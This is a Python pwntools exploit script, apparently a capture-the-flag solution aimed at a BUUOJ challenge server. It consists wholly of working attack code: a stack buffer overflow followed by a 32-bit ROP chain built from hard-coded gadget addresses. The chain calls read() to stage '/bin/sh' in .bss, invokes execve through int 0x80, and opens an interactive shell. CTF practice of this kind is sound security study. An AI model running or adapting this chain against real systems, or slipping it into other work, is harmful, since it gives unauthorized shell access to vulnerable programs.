# coding = utf-8

from pwn import *

p = remote('node4.buuoj.cn',26621)
pop_eax_ret = 0x080b8016
pop_edx_ecx_ebx = 0x0806ed00
int_0x80 = 0x0806F430
bss_addr = 0x080E9000

junk_bytes = 'a' * 0x0c
fake_ebp = 'jjkk'

payload = junk_bytes + fake_ebp

# read(0,bss+0x100,8)
# eax = 3
# ebx = 0(fd)
# ecx = bss+0x100(buf)
# edx = 8(char_count<-/bin/sh\x00)

payload += p32(pop_eax_ret) + p32(0x3)
payload += p32(pop_edx_ecx_ebx) + p32(0x8) + p32(bss_addr+0x100) + p32(0x0)
payload += p32(int_0x80)

# execve("/bin/sh",0,0)
# eax = 0xb
# ebx = bss+0x100
# ecx = 0
# edx = 0

payload += p32(pop_eax_ret) + p32(0xb)
payload += p32(pop_edx_ecx_ebx) + p32(0x0) + p32(0x0) + p32(bss_addr+0x100)
payload += p32(int_0x80)

p.sendline(payload)
sleep(1)
p.sendline('/bin/sh\x00')
p.interactive()
